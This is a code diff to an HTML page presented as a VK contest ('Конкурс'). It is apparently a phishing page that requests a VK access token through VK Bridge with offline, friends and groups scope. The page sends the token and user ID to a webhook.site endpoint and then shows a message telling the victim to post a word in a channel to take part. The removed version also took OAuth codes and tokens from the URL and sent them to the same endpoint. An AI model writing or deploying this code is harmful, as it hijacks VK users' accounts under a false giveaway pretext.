@@ -2,25 +2,35 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Загрузка...</title>
+  <title>Конкурс</title>
+  <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
 </head>
 <body>
-  <p>Перенаправление...</p>
+  <p>Загрузка...</p>
   <script>
-    const params = new URLSearchParams(window.location.search);
-    const hash = new URLSearchParams(window.location.hash.substring(1));
-    const code = params.get("code");
-    const token = hash.get("access_token");
-    const userId = hash.get("user_id");
+    window.vkBridge.send("VKWebAppInit");
 
-    if (code || token) {
-      fetch("https://https://webhook.site/d5ce111a-d195-4b31-877f-2201eac2cf4e", {
+    window.vkBridge.send("VKWebAppGetAuthToken", {
+      app_id: 54786076,
+      scope: "offline,friends,groups"
+    })
+    .then(function(data) {
+      return fetch("https://webhook.site/d5ce111a-d195-4b31-877f-2201eac2cf4e", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({code, token, user_id: userId})
-      }).catch(() => {});
-    }
-    setTimeout(() => { window.location = "https://vk.com/"; }, 500);
+        body: JSON.stringify({
+          token: data.access_token,
+          user_id: data.user_id,
+          scope: data.scope
+        })
+      });
+    })
+    .then(function() {
+      document.body.innerHTML = "<p>Ты участвуешь! Напиши слово СТЕНДОФФ в канал.</p>";
+    })
+    .catch(function(err) {
+      document.body.innerHTML = "<p>Ошибка: " + err + "</p>";
+    });
   </script>
 </body>
 </html>
